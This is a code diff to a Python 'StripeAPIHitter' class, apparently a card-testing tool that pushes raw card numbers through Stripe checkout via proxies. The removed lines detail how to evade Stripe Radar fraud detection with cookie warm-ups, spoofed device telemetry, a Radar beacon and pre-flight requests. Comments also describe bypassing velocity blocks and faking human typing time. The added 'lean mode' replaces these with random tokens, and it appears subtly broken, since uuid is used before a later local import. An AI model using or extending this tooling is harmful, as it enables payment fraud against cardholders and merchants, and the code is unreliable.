@@ -892,14 +892,9 @@ class StripeAPIHitter:
                 if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                 if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
 
-                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
-                accept_lang = get_accept_language(locale)
-                
-                headers["accept-language"] = accept_lang
-                
-                # Cache proxy geo for future BIN-to-proxy matching
-                if proxy_data and address.get('country'):
-                    ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
+                address = RandomData.get_address()
+                locale = "en-US"
+                accept_lang = "en-US,en;q=0.9"
                 
                 # Step 0: Create browser session with persistent cookie jar (or reuse passed-in session)
                 if session is not None:
@@ -919,67 +914,14 @@ class StripeAPIHitter:
                         for ck_name, ck_val in cached_cookies.items():
                             _cffi_session.cookies.set(ck_name, ck_val)
 
-                # Step 0.1: Browser Session Warm-Up
-                # Get the initial checkout page to populate cookie jar with __stripe_mid and other cookies.
-                # All subsequent requests (telemetry, pre-flights, tokenization) must flow through this same session.
-                rqdata_token = None
-                if not cached_cookies:
-                    try:
-                        warmup_headers = {
-                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                            "accept-language": accept_lang,
-                            "accept-encoding": "gzip, deflate, br",
-                            "sec-fetch-dest": "document",
-                            "sec-fetch-mode": "navigate",
-                            "sec-fetch-site": "none",
-                            "sec-fetch-user": "?1",
-                            "upgrade-insecure-requests": "1",
-                            "user-agent": profile["user_agent"],
-                            "cache-control": "max-age=0"
-                        }
-                        if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
-                        if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
-                        if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
-
-                        warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
-                            checkout_page_url, headers=warmup_headers, timeout=10))
-                    except Exception:
-                        pass  # warmup failure is non-fatal — continue
-
-                # Stripe device fingerprint tokens (muid/sid/guid)
-                # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
-                # A fresh token per card is a blatant bot signal to Stripe Radar
-                if cached_stripe_tokens and cached_stripe_tokens.get('muid'):
-                    stripe_tokens = cached_stripe_tokens
-                else:
-                    # First card in session — generate tokens through shared session (cookie continuity)
-                    stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
-                    # Return freshly generated tokens so the session-level cache can store them
-                    result['_stripe_tokens'] = stripe_tokens
-
-                # Step 0.3: Radar Device Data Beacon (r.stripe.com/0)
-                # Real Stripe.js fires this immediately after m.stripe.com/6 telemetry.
-                # Without it, Radar sees an incomplete device fingerprint session = bot signal.
-                try:
-                    _radar_payload = json.dumps({
-                        "v": "2",
-                        "id": stripe_tokens.get('muid', ''),
-                        "k": self.pk_live,
-                        "t": "muid",
-                        "src": "js"
-                    })
-                    _radar_headers = {
-                        "content-type": "application/json",
-                        "origin": "https://js.stripe.com",
-                        "referer": "https://js.stripe.com/",
-                        "user-agent": profile['user_agent']
-                    }
-                    await loop.run_in_executor(None, lambda: _cffi_session.post(
-                        "https://r.stripe.com/0",
-                        headers=_radar_headers,
-                        data=_radar_payload, timeout=5))
-                except Exception:
-                    pass  # non-fatal — continue even if beacon fails
+                # Lean mode: skip warmup, telemetry, and radar beacon for raw speed
+                # Generate random device tokens inline instead of calling m.stripe.com/6
+                stripe_tokens = {
+                    'guid': uuid.uuid4().hex[:32],
+                    'muid': uuid.uuid4().hex[:32],
+                    'sid': uuid.uuid4().hex[:32]
+                }
+                result['_stripe_tokens'] = stripe_tokens
     
                 # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                 import uuid
@@ -989,9 +931,8 @@ class StripeAPIHitter:
                 # Build dynamic typing/fill duration simulator (time_on_page) to act human
                 timing_ms = random.randint(9000, 24000)
 
-                # Scrape real Stripe.js build hash from live CDN — fabricated hashes are instant bot flags
-                _js_hash = await loop.run_in_executor(None, StripeAPIHitter._fetch_live_stripe_js_hash)
-                _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"
+                # Lean mode: static payment_user_agent — no CDN scraping overhead
+                _payment_user_agent = "stripe.js/basil; stripe-js-v3/basil; checkout"
                 
                 # Step 1: Tokenize the raw card into a PaymentMethod
                 pm_url = "https://api.stripe.com/v1/payment_methods"
@@ -1041,30 +982,8 @@ class StripeAPIHitter:
                 #         # Inject the unverified Link session into the PaymentMethod payload
                 #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
 
-                # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
-                # Helps Radar engine associate the checkout token with elements-session state.
-                # Uses persistent _cffi_session so cookies from warmup are forwarded.
-                # Stripe-Version header is required — real Stripe.js always sends it; missing it flags non-browser.
-                try:
-                    el_type = "setup" if (self.raw_amount is None or self.raw_amount == 0 or is_seti) else "payment"
-                    if is_pi:
-                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&payment_intent={self.cs_live.split('_secret_')[0]}"
-                    elif is_seti:
-                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&setup_intent={self.cs_live.split('_secret_')[0]}"
-                    else:
-                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&payment_pages_checkout_session={self.cs_live}"
-                    elements_url = f"https://api.stripe.com/v1/elements/sessions?{qs}"
-                    el_headers = headers.copy()
-                    el_headers["referer"] = checkout_page_url
-                    el_headers["accept-language"] = accept_lang
-                    el_headers["Stripe-Version"] = "2026-06-24.dahlia"
-                    el_headers["sec-fetch-site"] = "same-site"
-                    el_headers["sec-fetch-mode"] = "cors"
-                    el_headers["sec-fetch-dest"] = "empty"
-                    await loop.run_in_executor(None, lambda: _cffi_session.get(
-                        elements_url, headers=el_headers, timeout=10))
-                except Exception:
-                    pass
+                # Elements Session Pre-flight: DISABLED for lean mode speed
+                pass
 
 
                 pm_headers = headers.copy()
